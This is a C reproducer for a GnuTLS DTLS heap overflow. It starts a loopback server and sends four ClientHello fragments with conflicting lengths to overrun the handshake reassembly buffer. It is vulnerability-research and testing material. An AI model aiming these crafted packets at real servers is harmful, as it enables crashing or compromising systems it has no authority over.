/*
 * CVE-2026-33846 / GNUTLS-SA-2026-04-29-1 reproducer.
 *
 * Loopback-only DTLS 1.2 server fed four ClientHello fragments whose
 * message_length claims conflict.  The first fragment allocates a small
 * reassembly buffer; later fragments merge past its end in
 * merge_handshake_packet() (lib/buffers.c:1035 in pinned 3.8.12).
 *
 * Structure follows issue https://gitlab.com/gnutls/gnutls/-/issues/1816
 * (Haruto Kimura), rewritten for a local pinned build.  No external target.
 */
#include <errno.h>
#include <gnutls/gnutls.h>
#include <gnutls/dtls.h>
#include <gnutls/x509.h>
#include <netinet/in.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

#define PORT 4433

static void put16(uint8_t *b, uint16_t v) { b[0] = v >> 8; b[1] = v & 0xff; }
static void put24(uint8_t *b, uint32_t v) {
	b[0] = (v >> 16) & 0xff; b[1] = (v >> 8) & 0xff; b[2] = v & 0xff;
}

static gnutls_certificate_credentials_t xcred;
static gnutls_priority_t priority_cache;
static volatile int fragments_sent;

static int send_fragment(int sock, struct sockaddr_in *addr, uint32_t msg_len,
                         uint32_t frag_off, uint32_t frag_len, uint8_t fill,
                         uint8_t seq_lo)
{
	uint8_t pkt[2048];
	if (13 + 12 + frag_len > sizeof(pkt)) return -1;
	memset(pkt, 0, sizeof(pkt));
	pkt[0] = 22;                /* handshake */
	pkt[1] = 254; pkt[2] = 253; /* DTLS 1.2 */
	pkt[9] = seq_lo;
	put16(pkt + 11, 12 + frag_len);
	pkt[13] = 1;                /* ClientHello */
	put24(pkt + 14, msg_len);
	put24(pkt + 19, frag_off);
	put24(pkt + 22, frag_len);
	memset(pkt + 25, fill, frag_len);
	return sendto(sock, pkt, 25 + frag_len, 0,
	              (struct sockaddr *)addr, sizeof(*addr));
}

static void *server_thread(void *arg)
{
	int fd = socket(AF_INET, SOCK_DGRAM, 0), reuse = 1;
	struct sockaddr_in sa, ca;
	socklen_t clen = sizeof(ca);
	uint8_t peek[4096];
	gnutls_session_t session;
	int ret;

	(void)arg;
	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(PORT);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
	if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("bind"); close(fd); return NULL;
	}
	if (recvfrom(fd, peek, sizeof(peek), MSG_PEEK,
	             (struct sockaddr *)&ca, &clen) < 0) {
		perror("recvfrom"); close(fd); return NULL;
	}
	if (connect(fd, (struct sockaddr *)&ca, clen) < 0) {
		perror("connect"); close(fd); return NULL;
	}
	if (gnutls_init(&session, GNUTLS_SERVER | GNUTLS_DATAGRAM) < 0) {
		fprintf(stderr, "[SERVER] init failed\n"); close(fd); return NULL;
	}
	gnutls_priority_set(session, priority_cache);
	gnutls_credentials_set(session, GNUTLS_CRD_CERTIFICATE, xcred);
	gnutls_transport_set_int(session, fd);
	gnutls_dtls_set_mtu(session, 1500);
	gnutls_dtls_set_timeouts(session, 1000, 5000);
	while (!fragments_sent) usleep(10000);
	usleep(50000);
	fprintf(stderr, "[SERVER] starting handshake\n");
	do {
		ret = gnutls_handshake(session);
	} while (ret == GNUTLS_E_AGAIN || ret == GNUTLS_E_INTERRUPTED);
	fprintf(stderr, "[SERVER] handshake returned %d (%s)\n",
	        ret, gnutls_strerror(ret));
	gnutls_deinit(session);
	close(fd);
	return NULL;
}

int main(void)
{
	int sock;
	struct sockaddr_in addr;
	pthread_t tid;
	gnutls_x509_privkey_t privkey;
	gnutls_x509_crt_t crt;

	gnutls_global_init();
	gnutls_certificate_allocate_credentials(&xcred);
	gnutls_priority_init(&priority_cache, "NORMAL", NULL);
	gnutls_x509_privkey_init(&privkey);
	gnutls_x509_privkey_generate(privkey, GNUTLS_PK_ECDSA,
		GNUTLS_CURVE_TO_BITS(GNUTLS_ECC_CURVE_SECP256R1), 0);
	gnutls_x509_crt_init(&crt);
	gnutls_x509_crt_set_version(crt, 3);
	gnutls_x509_crt_set_serial(crt, (const unsigned char *)"\x01", 1);
	gnutls_x509_crt_set_activation_time(crt, time(NULL));
	gnutls_x509_crt_set_expiration_time(crt, time(NULL) + 86400 * 365);
	gnutls_x509_crt_set_dn_by_oid(crt, GNUTLS_OID_X520_COMMON_NAME, 0,
	                              "localhost", strlen("localhost"));
	gnutls_x509_crt_set_key(crt, privkey);
	gnutls_x509_crt_sign2(crt, crt, privkey, GNUTLS_DIG_SHA256, 0);
	gnutls_certificate_set_x509_key(xcred, &crt, 1, privkey);
	gnutls_x509_crt_deinit(crt);
	gnutls_x509_privkey_deinit(privkey);

	if (pthread_create(&tid, NULL, server_thread, NULL) != 0) {
		fprintf(stderr, "pthread_create failed\n"); return 2;
	}
	usleep(200000);
	sock = socket(AF_INET, SOCK_DGRAM, 0);
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	/* SAFE=1 keeps message_length consistent (3000) across all fragments. */
	send_fragment(sock, &addr, getenv("SAFE") ? 3000 : 50, 25, 25, 'B', 0);
	/* Fragment 2: conflicting msg_len=3000, in-bounds prefix. */
	send_fragment(sock, &addr, 3000, 0, 48, 'C', 1);
	/* Fragment 3: offset 40 + 1475 = 1515, still inside 2048. */
	send_fragment(sock, &addr, 3000, 40, 1475, 'D', 2);
	/* Fragment 4: offset 1500 + 1475 = 2975, 927 bytes past 2048. */
	send_fragment(sock, &addr, 3000, 1500, 1475, 'E', 3);
	fragments_sent = 1;
	fprintf(stderr, "[CLIENT] four fragments sent\n");
	close(sock);
	pthread_join(tid, NULL);
	gnutls_certificate_free_credentials(xcred);
	gnutls_priority_deinit(priority_cache);
	gnutls_global_deinit();
	return 0;
}
